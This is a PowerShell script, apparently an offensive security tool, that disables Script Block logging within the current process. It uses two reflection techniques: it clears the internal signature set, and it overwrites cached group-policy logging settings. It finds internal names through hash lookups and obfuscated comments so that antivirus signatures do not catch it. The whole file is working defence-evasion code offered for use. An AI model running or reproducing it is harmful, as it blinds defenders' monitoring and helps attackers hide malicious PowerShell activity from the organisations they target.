#requires -version 5

<#
.SYNOPSIS
    
Attempts to disable Script Block logging within current process using well-known techniques laid out in an unsignatured way.

Author: Mariusz Banach (@mgeeky)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Tries to evade Script Block logging by leveraging couple of publicly documented techniqus, but in 
an approach to avoid signatured or otherwise considered harmful keywords. 

Notice: These techniques only disable Script Block logging within current process context. Tricks implemented 
are not system-wide and not permament.

Using a hash-lookup approach when determining prohibited symbol names, we are able
to avoid relying on blacklisted values and having them hardcoded within the script. 
This implementation iterates over all of the assemblies, their exposed types, methods and 
fields in order to find those that are required but by their computed hash-value rather than
direct name. Since hash-value computation algorithm was open-sources and is simple to 
manipulate, the attacker becomes able to customize hash-lookup scheme the way he likes.

A simplest approach to alter return values coming out of Get-Hash would be to change the
initial value of $val variable. 

The script comes up with several techniques implemented. Triggers them one by one. Should one
return successfully, the script is going to finish it's execution.

The approaches implemented in this script heavily rely on the previous work of:

- Ryan Cobb: https://cobbr.io/ScripXXXtBlock-Logging-BypXXXass.html
- Ryan Cobb: https://cobbr.io/ScriptXXXBlock-Warning-Event-Logging-BypXXXass.html

.EXAMPLES

PS> Disable-ScriptLogging

#>

function Disable-ScriptLogging
{
    function bitshift 
    {
        param(
            [Parameter(Mandatory,Position=0)]
            [long]$x,

            [Parameter(ParameterSetName='Left')]
            [ValidateRange(0,[int]::MaxValue)]
            [int]$Left,

            [Parameter(ParameterSetName='Right')]
            [ValidateRange(0,[int]::MaxValue)]
            [int]$Right
        )

        $shift = if($PSCmdlet.ParameterSetName -eq 'Left')
        { 
            $Left
        }
        else
        {
            -$Right
        }

        $ret = [math]::Floor($x * [math]::Pow(2,$shift))
        return [System.Convert]::TOUInt32($ret -band ([uint32]::MaxValue))
    }

    function Get-Hash 
    {
        param(
            [Parameter(Mandatory = $true)]
            [AllowEmptyString()]
            [string]$name
        )
        if ($name.Length -eq 0)
        {
            return 0
        }
    
        $name = $name.ToLower();
        $val = 5381
        for($i = 0; $i -lt $name.Length; $i++)
        {
            $n = bitshift $val -left 5
            $val = ($n + $val) + [byte][char]$name[$i]
        }

        return $val
    }

    function ScriptLogging-Technique1
    {
        $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}
        $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 12579468197}
        $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 12250760746}
        $out = $foo.GetValue($null)
        $k0 = ""
        foreach ($item in $out){
            if((Get-Hash($item)) -eq 32086076268) { # ScrXiptBloXckLogXging
                $k0 = $item
                break
            }
        }
        $foo.SetValue($null,(New-Object Collections.Generic.HashSet[string]))
        Write-Host "[+] Finished applying technique 1"
        return $k0
    }

    function ScriptLogging-Technique2($k0)
    {
        $asm = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.Location -and ((Get-Hash($_.Location.Split('\')[-1])) -eq 65764965518)}  # SysXtem.ManaXgement.AutomaXtion.dll
        $mytype = $asm.GetTypes() | ? {(Get-Hash($_.Name)) -eq 4572158998} # UXtils
        $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 52485150955} # caXchedGrXoupPoXlicySettXings
        if(-not $foo -or $foo -eq $null) {
            $foo = $mytype.GetFields([System.Reflection.BindingFlags]40) | ? {(Get-Hash($_.Name)) -eq 56006640029} # s_caXchedGrXoupPoXlicySettXings
        }

        if($foo) {
            $cache = $foo.GetValue($null)
            $k1 = $cache.Keys | ? {(Get-Hash($_.Split('\\')[-1])) -eq 32086076268} # ScrXiptBloXckLogXging
            if($k1 -and $cache[$k1]) {
                $k2 = $cache[$k1].Keys | ? {(Get-Hash($_)) -eq 45083803091} # EnabXleScrXiptBloXckLogXging
                $k3 = $cache[$k1].Keys | ? {(Get-Hash($_)) -eq 70211596397} # EnabXleScrXiptBloXckInvocXationLogXging
                if($k2 -and $cache[$k1][$k2]) {
                    $cache[$k1][$k2] = 0
                }
                if($k3 -and $cache[$k1][$k3]) {
                    $cache[$k1][$k3] = 0
                }
            }

            $vl = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
            $vl.Add('Enabl'+'e'+$k0, 0)
            $k01 = $k0 -replace 'kL', 'kInvocationL'
            $vl.Add('Ena'+'ble'+$k01, 0)
            $cache['HKEY_LOCAL_M'+'ACHINE\Software\Policie'+'s\Microsoft\Wind'+'ows\PowerSh'+'ell\'+$k0] = $vl
        }

        Write-Host "[+] Finished applying technique 2"
    }

    $out = ScriptLogging-Technique1
    ScriptLogging-Technique2 $out
}